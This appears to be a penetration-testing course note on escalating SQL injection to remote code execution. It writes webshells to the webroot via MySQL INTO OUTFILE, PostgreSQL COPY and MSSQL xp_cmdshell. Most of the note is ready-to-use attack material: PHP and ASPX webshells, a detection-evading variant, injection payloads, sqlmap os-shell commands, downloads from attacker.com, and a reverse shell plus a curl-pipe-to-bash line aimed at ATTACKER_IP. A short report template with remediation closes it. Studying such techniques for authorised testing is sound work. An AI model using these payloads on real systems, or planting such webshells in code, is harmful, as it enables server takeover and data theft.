---
tags: [vapt, sqli, advanced]
difficulty: advanced
module: "06 - SQL Injection"
topic: "06.25 Writing Files / Webshells via SQLi (INTO OUTFILE)"
---

# 06.25 — Writing Files / Webshells via SQLi

## Overview

If you can write files via SQLi, you can write a PHP/ASP webshell to the webroot — turning SQL injection into Remote Code Execution. This is a critical escalation path.

```
ESCALATION PATH:
  SQL Injection → FILE write privilege → Write PHP webshell to /var/www/html/
  → Access webshell via browser
  → Execute OS commands!
  → Full server compromise!

REQUIREMENTS FOR MYSQL:
  ✓ FILE privilege for current DB user
  ✓ @@secure_file_priv = '' or NULL (no restriction)
  ✓ MySQL process has WRITE access to webroot directory
  ✓ Know the webroot path!
  ✓ Web server must execute the file type (PHP, ASP, etc.)
```

---

## MySQL INTO OUTFILE

```sql
-- BASIC FILE WRITE:
SELECT 'content' INTO OUTFILE '/path/to/file.txt'

-- PHP WEBSHELL (standard):
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'
-- Access: https://target.com/shell.php?cmd=id

-- PHP WEBSHELL (more stealthy - b64 decode):
SELECT '<?php system(base64_decode($_GET["c"])); ?>' INTO OUTFILE '/var/www/html/b64.php'
-- Access: ?c=d2hvYW1p (base64 of "whoami")

-- PHP EVAL WEBSHELL (flexible):
SELECT '<?php eval($_POST["x"]); ?>' INTO OUTFILE '/var/www/html/eval.php'
-- POST request: curl https://target.com/eval.php -d "x=system('id');"

-- WRITE VIA UNION SQLI:
' UNION SELECT '<?php system($_GET["cmd"]); ?>', NULL INTO OUTFILE '/var/www/html/cmd.php'--

-- ALSO WORKS WITH UNION 1-COLUMN:
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/cmd.php'--

-- DUMPFILE (no line terminator added):
SELECT '<?php system($_GET["cmd"]); ?>' INTO DUMPFILE '/var/www/html/cmd.php'
-- Use DUMPFILE for binary content (no newlines added!)

-- MULTIPLE COLUMNS → CONCAT INTO ONE:
' UNION SELECT '<?php ', 'system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/cmd.php'--
-- NOTE: OUTFILE adds \t between columns! Use CONCAT instead:
' UNION SELECT CONCAT('<?php system($_GET["cmd"]); ?>'),NULL INTO OUTFILE '/var/www/html/cmd.php'--
```

---

## Bypassing secure_file_priv Restriction

```sql
-- CHECK WHERE FILES ARE ALLOWED:
SELECT @@secure_file_priv
-- '' or NULL → anywhere!
-- '/var/lib/mysql/' → only that directory (can't write to webroot directly!)

-- IF RESTRICTED TO /var/lib/mysql/:
-- Try UNC path (Windows): \\server\share\file.php
-- If MySQL runs on Windows and UNC is available

-- WORKAROUNDS:
-- 1. Write to /var/lib/mysql/ then copy with xp_cmdshell (MSSQL)
-- 2. Use a writable directory in the restriction path
-- 3. Look for other write paths (MySQL plugin dir, etc.)
```

---

## PostgreSQL File Write

```sql
-- COPY TO (requires superuser):
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php'
-- Direct webshell write!

-- VIA STACKED QUERY:
'; COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php'--

-- LARGE OBJECT EXPORT:
SELECT lo_from_bytea(0, decode('3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e', 'hex'))
-- Then: SELECT lo_export(oid, '/var/www/html/shell.php')

-- WRITE TO POSTGRES CONF (for persistence!):
-- Only if superuser:
COPY (SELECT '<?php system($_GET["c"]); ?>') TO '/etc/postgresql/14/main/evil.php'
-- Won't be in webroot but useful for local access
```

---

## MSSQL File Write

```sql
-- xp_cmdshell (requires sysadmin):
EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php'

-- WITH CERTUTIL (download from attacker server):
EXEC xp_cmdshell 'certutil -urlcache -f http://attacker.com/shell.php C:\inetpub\wwwroot\shell.php'

-- POWERSHELL DOWNLOAD:
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://attacker.com/shell.php -OutFile C:\inetpub\wwwroot\shell.php"'

-- WRITE ASPX WEBSHELL (for IIS):
EXEC xp_cmdshell 'echo ^<%@ Page Language="C#" %^>^<% Response.Write(System.Diagnostics.Process.Start("cmd","/c " + Request["c"]).StandardOutput.ReadToEnd()); %^> > C:\inetpub\wwwroot\shell.aspx'
-- Access: https://target.com/shell.aspx?c=whoami
```

---

## Webshell Variations

```php
<?php system($_GET["cmd"]); ?>           // simplest
<?php passthru($_GET["cmd"]); ?>         // alternative
<?php exec($_GET["cmd"], $o); echo implode("\n",$o); ?>  // exec
<?php echo shell_exec($_GET["cmd"]); ?>  // shell_exec (no output if not found)
<?php `$_GET[c]`; ?>                     // backtick execution (no output)
<?php eval($_POST["x"]); ?>              // eval (accepts PHP code!)
<?php system(base64_decode($_GET["c"])); ?>  // base64 encoded commands

// AVOID KEYWORD DETECTION:
<?php $a='sys'.'tem'; $a($_GET['c']); ?>

// HTTP AUTH PROTECTED:
<?php 
if ($_SERVER['HTTP_X_AUTH'] == 'secret123') {
    system($_GET['c']);
}
?>
// Access: curl -H "X-Auth: secret123" https://target.com/shell.php?c=id
```

---

## SQLMap Automated Webshell

```bash
# SQLMAP --os-shell:
sqlmap -u "https://target.com/?id=1" --os-shell
# sqlmap automatically:
# 1. Tests for FILE privilege
# 2. Finds the webroot (tries common paths)
# 3. Writes a webshell
# 4. Gives you an interactive shell prompt!

# IF WEBROOT NOT FOUND, SPECIFY:
sqlmap -u "https://target.com/?id=1" --os-shell --web-root="/var/www/html"

# FILE WRITE DIRECTLY:
sqlmap -u "https://target.com/?id=1" \
  --file-write="./local-shell.php" \
  --file-dest="/var/www/html/remote-shell.php"

# AFTER WEBSHELL UPLOAD, USE INTERACTIVE MODE:
sqlmap -u "https://target.com/?id=1" --os-cmd="whoami"
```

---

## Post-Webshell Access

Once webshell is accessible:

```bash
# BASIC COMMAND EXECUTION:
curl "https://target.com/shell.php?cmd=id"
curl "https://target.com/shell.php?cmd=whoami"
curl "https://target.com/shell.php?cmd=hostname"
curl "https://target.com/shell.php?cmd=cat%20/etc/passwd"
curl "https://target.com/shell.php?cmd=ls%20-la%20/var/www/html"

# REVERSE SHELL FROM WEBSHELL:
# Set up listener:
nc -lvnp 4444

# Trigger reverse shell via webshell:
curl "https://target.com/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/ATTACKER_IP/4444%200%3E%261%27"

# URL decoded cmd: bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# DOWNLOAD AND EXECUTE:
curl "https://target.com/shell.php?cmd=curl%20http://ATTACKER/revshell.sh|bash"

# WEEVELY (PHP webshell manager):
weevely generate password /tmp/shell.php    # generate obfuscated webshell
# Upload via SQLi file write
weevely https://target.com/shell.php password  # connect to shell
```

---

## Reporting SQL Injection to RCE

```markdown
TITLE: SQL Injection → Remote Code Execution via File Write

SEVERITY: Critical (CVSS 10.0)

ATTACK CHAIN:
  1. SQL Injection in /product?id= parameter
  2. MySQL user has FILE privilege
  3. secure_file_priv is unrestricted
  4. Wrote PHP webshell to webroot
  5. Executed OS commands via webshell
  
PROOF OF CONCEPT:
  Step 1: Verify FILE privilege:
    GET /product?id=1'+UNION+SELECT+NULL,file_priv,NULL+FROM+mysql.user+WHERE+user=user()--
    → Response: "Y" (FILE privilege confirmed)
    
  Step 2: Write webshell:
    GET /product?id=1'+UNION+SELECT+NULL,'<?php+system($_GET["cmd"]);+?>',NULL+INTO+OUTFILE+'/var/www/html/cmd.php'--
    
  Step 3: Execute commands:
    GET /cmd.php?cmd=id
    → Response: "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
    
IMPACT: Full server compromise, data exfiltration, persistence

REMEDIATION:
  1. Use parameterized queries (eliminate SQLi)
  2. Revoke FILE privilege from MySQL application user
  3. Set secure_file_priv to a non-web directory
  4. Run MySQL as a limited-privilege user
  5. Apply principle of least privilege
```

---

## Related Notes
- [[24 - Reading Files via SQLi]] — LOAD_FILE for reading
- [[15 - MySQL Specific Payloads]] — MySQL INTO OUTFILE details
- [[17 - MSSQL Specific Payloads]] — MSSQL xp_cmdshell
- [[21 - sqlmap Full Usage Guide]] — sqlmap --os-shell
